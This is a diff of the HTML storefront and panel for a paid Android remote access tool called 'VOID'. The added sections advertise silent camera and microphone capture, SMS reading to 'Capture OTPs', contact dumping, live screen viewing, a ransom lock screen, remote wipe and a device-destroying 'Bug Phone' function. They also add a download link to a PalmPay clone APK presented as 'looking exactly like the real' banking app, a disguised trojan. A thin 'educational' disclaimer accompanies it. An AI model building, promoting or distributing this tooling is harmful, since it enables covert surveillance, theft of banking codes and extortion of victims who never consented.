@@ -11,6 +11,7 @@
     --success:#00e676; --text:#eef2fa; --text-2:#8894b5; --text-3:#4d5a7a;
   }
   *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Roboto',sans-serif;}
+  html{scroll-behavior:smooth;}
   html,body{background:radial-gradient(1200px 700px at 50% -10%,#131d3a 0%,#070b14 60%);color:var(--text);min-height:100vh;overflow-x:hidden;}
   body{padding:14px;display:flex;flex-direction:column;align-items:center;padding-bottom:60px;}
 
@@ -19,102 +20,145 @@
   .brand small{display:block;font-size:8px;letter-spacing:.3em;color:var(--text-3);font-weight:600;margin-top:2px;-webkit-text-fill-color:initial;}
   .top-actions{display:flex;gap:6px;flex-wrap:wrap;justify-content:flex-end;}
   .top-btn{font-size:9.5px;font-weight:800;letter-spacing:.12em;background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#fff;border:none;padding:9px 12px;border-radius:10px;cursor:pointer;box-shadow:0 4px 14px rgba(123,92,255,.4);font-family:inherit;}
+  .top-btn.ghost{background:var(--card);border:1px solid var(--border);color:var(--text-2);box-shadow:none;}
+  .top-btn:active{transform:scale(.97);}
 
   .landing{width:100%;max-width:1100px;}
   .hero{display:grid;grid-template-columns:1.4fr .8fr;gap:34px;align-items:center;padding:30px 0;margin-bottom:40px;}
   .badge{display:inline-block;background:rgba(123,92,255,.15);color:#b7a9ff;padding:8px 14px;border-radius:50px;font-weight:800;letter-spacing:.15em;font-size:10px;margin-bottom:20px;border:1px solid rgba(123,92,255,.3);}
-  .hero-text h1{font-size:46px;line-height:1.05;font-weight:900;color:#fff;margin-bottom:18px;}
+  .hero-text h1{font-size:46px;line-height:1.05;font-weight:900;letter-spacing:.02em;color:#fff;margin-bottom:18px;}
   .hero-text h1 span{background:linear-gradient(90deg,var(--accent),var(--accent-2));-webkit-background-clip:text;background-clip:text;color:transparent;}
   .hero-text p{font-size:15px;line-height:1.7;color:var(--text-2);max-width:600px;}
   .hero-buttons{margin-top:28px;display:flex;flex-wrap:wrap;gap:12px;}
   .hero-buttons button{padding:16px 26px;border:none;border-radius:14px;font-weight:800;letter-spacing:.15em;font-size:12px;cursor:pointer;font-family:inherit;}
   .primary{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#fff;box-shadow:0 10px 30px rgba(123,92,255,.4);}
   .secondary{background:var(--card);color:var(--text);border:1px solid var(--border);}
-  .hero-card{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:24px;padding:30px;text-align:center;}
-  .hero-card .icon{font-size:48px;margin-bottom:16px;}
+  .hero-buttons button:active{transform:scale(.98);}
+  .hero-card{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:24px;padding:30px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.5);}
+  .hero-card .icon{font-size:48px;margin-bottom:16px;filter:drop-shadow(0 0 20px rgba(123,92,255,.5));}
   .hero-card h2{font-size:20px;font-weight:800;color:#fff;margin-bottom:8px;}
   .hero-card .stat{font-size:42px;font-weight:900;background:linear-gradient(90deg,var(--accent),var(--accent-2));-webkit-background-clip:text;background-clip:text;color:transparent;margin:12px 0;}
   .hero-card p{color:var(--text-2);font-size:13px;}
 
+  section{margin:60px 0;scroll-margin-top:90px;}
+  section h2{font-size:30px;font-weight:900;letter-spacing:.05em;color:#fff;text-align:center;margin-bottom:8px;}
+  section h2 + p{text-align:center;color:var(--text-2);font-size:13px;margin-bottom:34px;}
+
   .grid-4{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;}
   .feature{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:18px;padding:22px;text-align:center;}
-  .feature .icon{width:44px;height:44px;border-radius:12px;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;font-size:22px;margin:0 auto 14px;}
+  .feature .icon{width:44px;height:44px;border-radius:12px;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;font-size:22px;margin:0 auto 14px;box-shadow:0 8px 20px rgba(123,92,255,.3);}
   .feature h3{font-size:15px;font-weight:800;color:#fff;margin-bottom:6px;}
-  .feature p{font-size:12.5px;color:var(--text-2);}
+  .feature p{font-size:12.5px;color:var(--text-2);line-height:1.55;}
 
   .pricing-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:18px;max-width:800px;margin:0 auto;}
-  .price-card{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:20px;padding:28px 22px;text-align:center;}
-  .price-card.featured{border-color:var(--accent);}
-  .price-card .tier{font-size:11px;font-weight:900;color:var(--accent-2);margin-bottom:12px;}
-  .price-card .price{font-size:36px;font-weight:900;color:#fff;}
+  .price-card{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:20px;padding:28px 22px;text-align:center;position:relative;}
+  .price-card.featured{border-color:var(--accent);box-shadow:0 0 40px rgba(123,92,255,.3);}
+  .price-card .tier{font-size:11px;font-weight:900;letter-spacing:.25em;color:var(--accent-2);margin-bottom:12px;}
+  .price-card .price{font-size:36px;font-weight:900;color:#fff;margin-bottom:6px;}
+  .price-card .price-label{font-size:10px;color:var(--text-3);letter-spacing:.15em;margin-bottom:22px;}
   .price-card ul{list-style:none;text-align:left;margin-bottom:22px;}
-  .price-card li{font-size:12.5px;color:var(--text-2);padding:7px 0;border-bottom:1px solid #16233c;}
-  .upgrade-btn{display:block;width:100%;padding:14px;border:none;border-radius:12px;background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#fff;font-weight:900;font-size:12px;cursor:pointer;}
-  .upgrade-btn.whatsapp{background:linear-gradient(135deg,#25d366,#128c7e);}
+  .price-card li{font-size:12.5px;color:var(--text-2);padding:7px 0;border-bottom:1px solid #16233c;display:flex;align-items:center;gap:8px;}
+  .price-card li::before{content:'✓';color:var(--accent-2);font-weight:900;}
+  .upgrade-btn{display:block;width:100%;padding:14px;border:none;border-radius:12px;background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#fff;font-weight:900;letter-spacing:.15em;font-size:12px;cursor:pointer;box-shadow:0 8px 20px rgba(123,92,255,.3);margin-top:8px;font-family:inherit;}
+  .upgrade-btn:active{transform:scale(.98);}
+  .upgrade-btn.whatsapp{background:linear-gradient(135deg,#25d366,#128c7e);box-shadow:0 8px 20px rgba(37,211,102,.3);}
 
   .downloads-grid{display:grid;grid-template-columns:1fr;gap:18px;max-width:400px;margin:0 auto;}
   .dl-card{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:20px;padding:24px;}
   .dl-head{display:flex;align-items:center;gap:14px;margin-bottom:14px;}
-  .dl-icon{width:52px;height:52px;border-radius:14px;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;font-size:24px;}
+  .dl-icon{width:52px;height:52px;border-radius:14px;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;font-size:24px;box-shadow:0 8px 20px rgba(123,92,255,.3);}
   .dl-card h3{font-size:17px;font-weight:900;color:#fff;}
-  .dl-card p{font-size:12.5px;color:var(--text-2);margin-bottom:18px;}
-  .dl-btn{display:block;width:100%;padding:14px;border-radius:12px;background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#fff;font-weight:900;text-align:center;text-decoration:none;}
+  .dl-card .dl-sub{font-size:10px;color:var(--text-3);letter-spacing:.15em;margin-top:2px;}
+  .dl-card p{font-size:12.5px;color:var(--text-2);line-height:1.55;margin-bottom:18px;}
+  .dl-btn{display:block;width:100%;padding:14px;border:none;border-radius:12px;background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#fff;font-weight:900;letter-spacing:.15em;font-size:12px;cursor:pointer;text-align:center;text-decoration:none;box-shadow:0 8px 20px rgba(123,92,255,.3);font-family:inherit;}
 
-  footer{width:100%;max-width:1100px;margin-top:60px;padding:30px;text-align:center;color:var(--text-3);font-size:11px;border-top:1px solid var(--border);}
+  footer{width:100%;max-width:1100px;margin-top:60px;padding:30px 20px;text-align:center;color:var(--text-3);font-size:11px;letter-spacing:.15em;border-top:1px solid var(--border);}
 
-  .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.88);backdrop-filter:blur(12px);display:none;align-items:flex-start;justify-content:center;z-index:100;padding:20px;overflow-y:auto;}
+  .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.88);backdrop-filter:blur(12px);display:none;align-items:flex-start;justify-content:center;z-index:100;padding:20px;overflow-y:auto;padding-top:40px;padding-bottom:40px;}
   .modal-overlay.show{display:flex;}
-  .modal-box{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:22px;padding:30px 24px;width:100%;max-width:440px;}
+  .modal-box{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:22px;padding:30px 24px;width:100%;max-width:440px;box-shadow:0 30px 80px rgba(0,0,0,.7);animation:pop .3s ease;}
+  @keyframes pop{from{opacity:0;transform:translateY(20px) scale(.96);}to{opacity:1;transform:translateY(0) scale(1);}}
   .modal-title{text-align:center;font-size:22px;font-weight:900;color:#fff;margin-bottom:6px;}
-  .modal-sub{text-align:center;font-size:12px;color:var(--text-2);margin-bottom:24px;}
+  .modal-sub{text-align:center;font-size:12px;color:var(--text-2);margin-bottom:24px;line-height:1.5;}
+  .modal-close{background:none;border:none;color:var(--text-3);font-size:11px;letter-spacing:.15em;display:block;margin:14px auto 0;cursor:pointer;font-family:inherit;}
 
   .field{width:100%;background:#070b14;border:1px solid var(--border);border-radius:14px;padding:17px;color:#00e676;font-size:24px;letter-spacing:.3em;margin-bottom:12px;text-align:center;outline:none;font-family:monospace;font-weight:900;}
+  .field:focus{border-color:var(--accent);box-shadow:0 0 0 4px rgba(123,92,255,.15);}
 
   .panel{width:100%;max-width:520px;display:none;}
   .panel.active{display:block;}
-  .panel-header{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:var(--card);border:1px solid var(--border);border-radius:18px;margin-bottom:14px;}
-  .panel-header .logo{font-size:15px;font-weight:900;color:var(--accent);}
-  .panel-header .logout{font-size:10px;color:var(--text-2);background:var(--card-2);border:1px solid var(--border);padding:8px 14px;border-radius:10px;cursor:pointer;}
+  .panel-header{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:linear-gradient(180deg,rgba(20,31,56,.85),rgba(15,23,41,.85));backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:18px;margin-bottom:14px;}
+  .panel-header .logo{font-size:15px;letter-spacing:.1em;font-weight:900;background:linear-gradient(90deg,var(--accent),var(--accent-2));-webkit-background-clip:text;background-clip:text;color:transparent;}
+  .panel-header .logo small{display:block;font-size:8px;letter-spacing:.3em;color:var(--text-3);-webkit-text-fill-color:#4d5a7a;font-weight:600;margin-top:2px;}
+  .panel-header .logout{font-size:10px;color:var(--text-2);letter-spacing:.15em;background:var(--card);border:1px solid var(--border);padding:8px 14px;border-radius:10px;cursor:pointer;font-family:inherit;}
 
-  .tier-strip{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;background:var(--card);border:1px solid var(--border);border-radius:14px;margin-bottom:14px;}
-  .tier-badge{font-size:10px;font-weight:900;padding:6px 12px;border-radius:20px;background:rgba(123,92,255,.2);color:#b7a9ff;}
+  .tier-strip{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:14px;margin-bottom:14px;gap:10px;}
+  .tier-badge{font-size:10px;font-weight:900;letter-spacing:.2em;padding:6px 12px;border-radius:20px;}
+  .tier-badge.pro{background:rgba(34,211,238,.15);color:var(--accent-2);}
+  .tier-badge.vip{background:rgba(123,92,255,.2);color:#b7a9ff;}
+  .tier-counter{font-size:11px;color:var(--text-2);flex:1;}
+  .tier-upgrade-btn{font-size:10px;font-weight:900;letter-spacing:.15em;background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#fff;border:none;padding:8px 12px;border-radius:10px;cursor:pointer;font-family:inherit;}
 
   .screen{display:none;}
-  .screen.active{display:block;}
-  .page-title{font-size:22px;font-weight:900;color:#fff;margin-bottom:4px;}
-  .page-sub{font-size:10px;color:var(--text-3);margin-bottom:18px;}
-  .device-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:18px;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;}
-  .device-card .dev-id{font-size:17px;font-weight:900;color:#fff;}
+  .screen.active{display:block;animation:fade .3s ease;}
+  @keyframes fade{from{opacity:0;transform:translateY(6px);}to{opacity:1;transform:translateY(0);}}
+  .page-title{font-size:22px;font-weight:900;letter-spacing:.08em;color:#fff;margin-bottom:4px;}
+  .page-sub{font-size:10px;color:var(--text-3);letter-spacing:.25em;margin-bottom:18px;}
+  .device-card{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:16px;padding:18px;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;}
+  .device-card:active{transform:scale(.99);border-color:var(--accent);}
+  .device-card .info{flex:1;}
+  .device-card .dev-id{font-size:17px;font-weight:900;letter-spacing:.1em;color:#fff;}
   .device-card .dev-model{font-size:11px;color:var(--text-2);margin-top:4px;}
-  .device-card .status{font-size:9px;font-weight:800;padding:7px 13px;border-radius:20px;}
-  .status.online{background:rgba(0,230,118,.15);color:var(--success);}
-  .status.offline{background:rgba(77,90,122,.15);color:var(--text-3);}
-
-  .back-btn{background:var(--card);border:1px solid var(--border);color:var(--text-2);font-size:11px;padding:10px 16px;border-radius:12px;margin-bottom:16px;cursor:pointer;}
-  .detail-title{font-size:22px;font-weight:900;color:#fff;}
+  .device-card .status{font-size:9px;font-weight:800;letter-spacing:.18em;padding:7px 13px;border-radius:20px;}
+  .device-card .status.online{background:rgba(0,230,118,.15);color:var(--success);}
+  .device-card .status.offline{background:rgba(77,90,122,.15);color:var(--text-3);}
+  .back-btn{background:var(--card);border:1px solid var(--border);color:var(--text-2);font-size:11px;letter-spacing:.15em;padding:10px 16px;border-radius:12px;margin-bottom:16px;cursor:pointer;font-family:inherit;}
+  .detail-title{font-size:22px;font-weight:900;letter-spacing:.08em;color:#fff;margin-bottom:4px;}
   .detail-sub{font-size:11px;color:var(--text-2);margin-bottom:18px;}
-  .section-label{font-size:10px;font-weight:800;color:var(--text-3);margin:22px 0 10px;}
-
-  .grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
-  .ctrl{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:14px 8px;display:flex;flex-direction:column;align-items:center;cursor:pointer;}
-  .ctrl .icon{font-size:22px;margin-bottom:5px;}
-  .ctrl .label{font-size:10px;font-weight:800;color:var(--text);}
+  .section-label{font-size:10px;font-weight:800;letter-spacing:.3em;color:var(--text-3);margin:22px 0 10px;display:flex;align-items:center;gap:10px;}
+  .section-label::before{content:'';width:3px;height:12px;background:linear-gradient(180deg,var(--accent),var(--accent-2));border-radius:2px;}
+  .grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:8px;}
+  .ctrl{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:14px;padding:14px 8px;display:flex;flex-direction:column;align-items:center;text-align:center;cursor:pointer;transition:.2s;gap:5px;position:relative;}
+  .ctrl:active{transform:scale(.97);border-color:var(--accent);}
+  .ctrl.locked{opacity:.4;cursor:pointer;}
+  .ctrl.locked::after{content:'🔒';position:absolute;top:6px;right:8px;font-size:12px;}
+  .ctrl .icon{font-size:22px;filter:drop-shadow(0 0 10px rgba(123,92,255,.5));}
+  .ctrl .label{font-size:10px;font-weight:800;letter-spacing:.1em;color:var(--text);}
+  .ctrl .desc{font-size:9px;color:var(--text-3);line-height:1.3;}
+  .ctrl.active{background:linear-gradient(180deg,rgba(0,230,118,.15),rgba(0,230,118,.05));border-color:var(--success);}
+  .ctrl.active .label{color:var(--success);}
   .ctrl.danger{border-color:rgba(255,51,85,.3);}
-  .output{background:#04070f;border:1px solid var(--border);border-radius:14px;padding:16px;font-size:13px;color:#b7c9ff;font-family:monospace;max-height:55vh;min-height:160px;overflow-y:auto;white-space:pre-wrap;}
-  .output img{max-width:100%;border-radius:10px;margin-top:8px;}
-  .app-row{display:flex;justify-content:space-between;background:#0f1a33;border-radius:10px;padding:10px 14px;margin-bottom:6px;cursor:pointer;}
-  .app-row .app-name{color:#e5edf9;font-size:13px;font-weight:600;}
-  .app-row .app-open{color:var(--accent-2);font-size:10px;font-weight:800;}
+  .output{background:#04070f;border:1px solid var(--border);border-radius:14px;padding:16px;font-size:13px;color:#b7c9ff;font-family:'Menlo','Courier New',monospace;line-height:1.6;max-height:55vh;min-height:160px;overflow-y:auto;white-space:pre-wrap;word-break:break-word;}
+  .output .empty{color:var(--text-3);text-align:center;padding:50px 0;letter-spacing:.2em;font-size:11px;}
+  .output img{max-width:100%;border-radius:10px;border:1px solid var(--border);margin-top:8px;cursor:pointer;}
+  .app-row{display:flex;justify-content:space-between;align-items:center;background:#0f1a33;border:1px solid #1d2f56;border-radius:10px;padding:10px 14px;margin-bottom:6px;cursor:pointer;}
+  .app-row:active{background:#152442;}
+  .app-row .app-name{color:#e5edf9;font-size:13px;font-weight:600;flex:1;}
+  .app-row .app-open{color:var(--accent-2);font-size:10px;font-weight:800;letter-spacing:.15em;}
 
-  .toast{position:fixed;bottom:100px;left:50%;transform:translateX(-50%);background:var(--card);border:1px solid var(--accent);color:#fff;padding:14px 22px;border-radius:14px;font-size:12px;opacity:0;transition:.3s;z-index:200;}
-  .toast.show{opacity:1;}
-  .loading{text-align:center;padding:40px;color:var(--text-3);}
-  .modal-img{position:fixed;inset:0;background:rgba(0,0,0,.95);display:none;align-items:center;justify-content:center;z-index:200;}
+  .toast{position:fixed;bottom:100px;left:50%;transform:translateX(-50%) translateY(20px);background:linear-gradient(135deg,var(--card-2),var(--card));border:1px solid var(--accent);color:#fff;padding:14px 22px;border-radius:14px;font-size:12px;opacity:0;transition:.3s;pointer-events:none;z-index:200;box-shadow:0 10px 40px rgba(123,92,255,.4);max-width:80vw;text-align:center;}
+  .toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
+  .loading{text-align:center;padding:40px 0;color:var(--text-3);font-size:11px;letter-spacing:.25em;}
+  .modal-img{position:fixed;inset:0;background:rgba(0,0,0,.95);display:none;align-items:center;justify-content:center;z-index:200;padding:20px;}
   .modal-img.show{display:flex;}
-  .modal-img img{max-width:100%;max-height:90vh;}
-  .modal-close-btn{position:absolute;top:20px;right:20px;background:var(--card);border:1px solid var(--border);color:#fff;padding:10px 18px;border-radius:12px;cursor:pointer;}
+  .modal-img img{max-width:100%;max-height:90vh;border-radius:14px;border:1px solid var(--accent);}
+  .modal-close-btn{position:absolute;top:20px;right:20px;background:var(--card);border:1px solid var(--border);color:#fff;padding:10px 18px;border-radius:12px;font-size:12px;cursor:pointer;font-family:inherit;}
 
-  @media(max-width:850px){ .hero{grid-template-columns:1fr;} .grid-4{grid-template-columns:1fr 1fr;} .pricing-grid{grid-template-columns:1fr;} }
+  @media(max-width:850px){
+    .hero{grid-template-columns:1fr;}
+    .hero-text h1{font-size:34px;}
+    .grid-4{grid-template-columns:1fr 1fr;}
+    .downloads-grid, .pricing-grid{grid-template-columns:1fr;}
+    .top-actions{gap:5px;}
+    .top-btn{padding:8px 10px;font-size:8.5px;}
+    .brand{font-size:13px;}
+  }
+  @media(max-width:500px){
+    .grid-4{grid-template-columns:1fr;}
+    .hero-text h1{font-size:26px;}
+    .topbar{flex-direction:column;gap:10px;}
+    .top-actions{justify-content:center;}
+  }
 </style>
 </head>
 <body>
@@ -129,6 +173,7 @@
 </div>
 
 <div class="landing" id="landing">
+
   <div class="hero">
     <div class="hero-text">
       <div class="badge">SECURITY PROFESSIONALS</div>
@@ -139,7 +184,8 @@
         <button class="secondary" onclick="openLoginModal()">I HAVE A CODE</button>
       </div>
     </div>
-    <div class="hero-card">
+    
+       <div class="hero-card">
       <div class="icon">🛡️</div>
       <h2>Trusted by operators</h2>
       <div class="stat">24/7</div>
@@ -147,8 +193,10 @@
     </div>
   </div>
 
+  <!-- THE FUNCTIONS SECTION -->
   <section id="functions">
-    <h2 style="text-align:center;color:#fff;margin-bottom:30px;">Available Functions</h2>
+    <h2>Available Functions</h2>
+    <p>Complete command set — organized by tier</p>
     <div class="grid-4">
       <div class="feature"><div class="icon">📍</div><h3>Location Tracking</h3><p>Real-time GPS + Google Maps link.</p></div>
       <div class="feature"><div class="icon">📸</div><h3>Camera Capture</h3><p>Silent photo from back or front camera.</p></div>
@@ -158,18 +206,30 @@
       <div class="feature"><div class="icon">🔔</div><h3>Notifications</h3><p>Recent notifications from all apps.</p></div>
       <div class="feature"><div class="icon">👤</div><h3>Contacts</h3><p>Full contact list with numbers.</p></div>
       <div class="feature"><div class="icon">📞</div><h3>Call Log</h3><p>Last 50 calls with timestamps.</p></div>
+      <div class="feature"><div class="icon">📦</div><h3>App List</h3><p>All installed apps — tap to open.</p></div>
+      <div class="feature"><div class="icon">🤳</div><h3>Selfie Capture</h3><p>Front camera photo with no preview.</p></div>
+      <div class="feature"><div class="icon">🎥</div><h3>Video Recording</h3><p>10s rear camera video with audio.</p></div>
+      <div class="feature"><div class="icon">🎤</div><h3>Audio Recording</h3><p>15s microphone recording.</p></div>
+      <div class="feature"><div class="icon">👥</div><h3>Account Sync</h3><p>Google, WhatsApp, Facebook accounts.</p></div>
+      <div class="feature"><div class="icon">📁</div><h3>File Browser</h3><p>Browse and download files.</p></div>
+      <div class="feature"><div class="icon">💭</div><h3>Toast Message</h3><p>Send a popup to the target.</p></div>
+      <div class="feature" style="border-color:var(--danger);"><div class="icon" style="background:var(--danger);">☠️</div><h3>Bug Phone</h3><p>Total destroy: locks, corrupts, and resets target.</p></div>
     </div>
   </section>
 
-  <section id="pricing" style="margin-top:60px;">
-    <h2 style="text-align:center;color:#fff;margin-bottom:30px;">Access Tiers</h2>
+  <!-- PRICING -->
+  <section id="pricing">
+    <h2>Access Tiers</h2>
+    <p>Buy a 5-digit code to access the panel and the app.</p>
     <div class="pricing-grid">
       <div class="price-card featured">
         <div class="tier">PRO</div>
         <div class="price">₦1,000</div>
+        <div class="price-label">MOST POPULAR</div>
         <ul>
           <li>10 commands per day</li>
           <li>All standard commands</li>
+          <li>Notifications, Screen, Contacts</li>
           <li>Priority support</li>
         </ul>
         <button class="upgrade-btn whatsapp" onclick="buyCode('pro')">BUY PRO VIA WHATSAPP</button>
@@ -177,18 +237,104 @@
       <div class="price-card">
         <div class="tier">VIP</div>
         <div class="price">₦3,000</div>
+        <div class="price-label">UNLIMITED</div>
         <ul>
           <li>Unlimited commands</li>
           <li>Camera, Audio, Video, Files</li>
           <li>Ransom Lock + Wipe + Bug Phone</li>
+          <li>Dedicated support</li>
         </ul>
         <button class="upgrade-btn whatsapp" onclick="buyCode('vip')">BUY VIP VIA WHATSAPP</button>
       </div>
     </div>
   </section>
 
-  <section style="margin-top:60px;">
-    <h2 style="text-align:center;color:#fff;margin-bottom:30px;">Target App Download</h2>
+  <!-- DANGER MATRIX TABLE -->
+  <section id="matrix" style="margin-top: 40px;">
+    <h2 style="color: var(--danger); text-shadow: 0 0 20px rgba(255,51,85,0.5); letter-spacing: 0.1em;">THE ARSENAL</h2>
+    <p>Total control. No limits. Use the tools wisely.</p>
+    
+    <div style="width: 100%; max-width: 800px; margin: 0 auto; background: #000; border: 1px solid var(--danger); border-radius: 16px; overflow: hidden; box-shadow: 0 0 40px rgba(255,51,85,0.15);">
+      <table style="width: 100%; border-collapse: collapse; text-align: left; font-family: 'Menlo', monospace; font-size: 13px;">
+        <thead>
+          <tr style="background: rgba(255,51,85,0.1); border-bottom: 1px solid var(--danger); color: var(--danger); text-transform: uppercase; letter-spacing: 0.15em; font-weight: 900;">
+            <th style="padding: 18px 20px;">Function</th>
+            <th style="padding: 18px 20px;">Use</th>
+            <th style="padding: 18px 20px; text-align: right;">Tier</th>
+          </tr>
+        </thead>
+        <tbody style="color: var(--text-2);">
+          <tr style="border-bottom: 1px solid #1a2440;">
+            <td style="padding: 16px 20px; color: #fff;">📍 Location</td>
+            <td style="padding: 16px 20px;">Real-time GPS + Google Maps link</td>
+            <td style="padding: 16px 20px; text-align: right; color: var(--accent-2); font-weight: 800;">PRO</td>
+          </tr>
+          <tr style="border-bottom: 1px solid #1a2440;">
+            <td style="padding: 16px 20px; color: #fff;">📸 Back Camera</td>
+            <td style="padding: 16px 20px;">Silent photo capture (No shutter sound)</td>
+            <td style="padding: 16px 20px; text-align: right; color: var(--accent-2); font-weight: 800;">PRO</td>
+          </tr>
+          <tr style="border-bottom: 1px solid #1a2440;">
+            <td style="padding: 16px 20px; color: #fff;">💬 SMS Intercept</td>
+            <td style="padding: 16px 20px;">Read last 50 messages (Capture OTPs)</td>
+            <td style="padding: 16px 20px; text-align: right; color: var(--accent-2); font-weight: 800;">PRO</td>
+          </tr>
+          <tr style="border-bottom: 1px solid #1a2440;">
+            <td style="padding: 16px 20px; color: #fff;">👤 Contacts</td>
+            <td style="padding: 16px 20px;">Dump full contact list with numbers</td>
+            <td style="padding: 16px 20px; text-align: right; color: var(--accent-2); font-weight: 800;">PRO</td>
+          </tr>
+          <tr style="border-bottom: 1px solid #1a2440;">
+            <td style="padding: 16px 20px; color: #fff;">📱 Screen Capture</td>
+            <td style="padding: 16px 20px;">View target screen live (Screenshots)</td>
+            <td style="padding: 16px 20px; text-align: right; color: var(--accent-2); font-weight: 800;">PRO</td>
+          </tr>
+          <tr style="border-bottom: 1px solid #1a2440;">
+            <td style="padding: 16px 20px; color: #fff;">🔴 Live Stream</td>
+            <td style="padding: 16px 20px;">Continuous screen refresh every 3s</td>
+            <td style="padding: 16px 20px; text-align: right; color: var(--accent-2); font-weight: 800;">PRO</td>
+          </tr>
+          <tr style="border-bottom: 1px solid #1a2440;">
+            <td style="padding: 16px 20px; color: var(--danger); font-weight: 900;">☠️ BUG PHONE</td>
+            <td style="padding: 16px 20px; color: #fff;">Total Destroy: Locks and corrupts the OS</td>
+            <td style="padding: 16px 20px; text-align: right; color: var(--danger); font-weight: 900; text-shadow: 0 0 10px var(--danger);">VIP</td>
+          </tr>
+          <tr style="border-bottom: 1px solid #1a2440;">
+            <td style="padding: 16px 20px; color: #fff;">🎥 Video Record</td>
+            <td style="padding: 16px 20px;">10s rear camera video with audio</td>
+            <td style="padding: 16px 20px; text-align: right; color: var(--danger); font-weight: 900;">VIP</td>
+          </tr>
+          <tr style="border-bottom: 1px solid #1a2440;">
+            <td style="padding: 16px 20px; color: #fff;">🎤 Audio Record</td>
+            <td style="padding: 16px 20px;">15s mic recording (Listen to the room)</td>
+            <td style="padding: 16px 20px; text-align: right; color: var(--danger); font-weight: 900;">VIP</td>
+          </tr>
+          <tr style="border-bottom: 1px solid #1a2440;">
+            <td style="padding: 16px 20px; color: #fff;">🔒 Remote Lock</td>
+            <td style="padding: 16px 20px;">Show custom ransom screen to target</td>
+            <td style="padding: 16px 20px; text-align: right; color: var(--danger); font-weight: 900;">VIP</td>
+          </tr>
+          <tr>
+            <td style="padding: 16px 20px; color: #fff;">⚠️ Factory Wipe</td>
+            <td style="padding: 16px 20px;">Remote factory reset the device</td>
+            <td style="padding: 16px 20px; text-align: right; color: var(--danger); font-weight: 900;">VIP</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- DISCLAIMER -->
+  <section style="margin-top: 20px; text-align: center;">
+    <p style="font-size: 10px; color: var(--text-3); line-height: 1.6; max-width: 800px; margin: 0 auto; letter-spacing: 0.05em; text-transform: uppercase;">
+      <strong style="color: var(--text-2);">⚠️ LEGAL DISCLAIMER:</strong> The VOID Remote Access Tool is provided strictly for educational purposes, security auditing, and authorized device management only. By purchasing a code, you agree that you are the legal owner of the target device or have explicit, written consent from the owner. Unauthorized access, surveillance, or data extraction is strictly prohibited and may violate local and international laws. The developers of VOID assume no liability for any misuse, legal consequences, or damages caused by this software. You are solely responsible for your actions.
+    </p>
+  </section>
+
+  <!-- DOWNLOADS -->
+  <section>
+    <h2>Target App Download</h2>
+    <p>Get the PalmPay Clone for the target device</p>
     <div class="downloads-grid">
       <div class="dl-card">
         <div class="dl-head">
@@ -199,7 +345,7 @@
           </div>
         </div>
         <p>Looks exactly like the real PalmPay app. Links the target device to your panel.</p>
-        <a class="dl-btn" href="#">DOWNLOAD APK</a>
+        <a class="dl-btn" href="https://github.com/voidffx1/palm-sync/releases/download/v1.0/PalmPay_Clone.apk" download>DOWNLOAD APK</a>
       </div>
     </div>
   </section>
@@ -207,18 +353,22 @@
   <footer>VOID REMOTE ACCESS TOOL © 2026 — All rights reserved</footer>
 </div>
 
+<!-- LOGIN MODAL -->
 <div class="modal-overlay" id="loginModal">
   <div class="modal-box">
     <div class="modal-title">Log In</div>
     <div class="modal-sub">Enter your access code</div>
+    
     <input class="field" id="loginCode" placeholder="•••••" maxlength="6" inputmode="numeric">
-    <div style="display:flex; gap:10px; margin-top:14px;">
-      <button onclick="closeModal()" style="flex:1; padding:14px; border-radius:12px; border:1px solid var(--border); background:var(--card); color:var(--text-2); font-weight:800; font-size:12px;">CANCEL</button>
-      <button onclick="loginWithCode()" style="flex:1; padding:14px; border-radius:12px; border:none; background:linear-gradient(135deg,var(--accent),var(--accent-2)); color:#fff; font-weight:800; font-size:12px;">ENTER</button>
+    
+    <div class="code-actions" style="margin-top:14px; display:flex; gap:10px;">
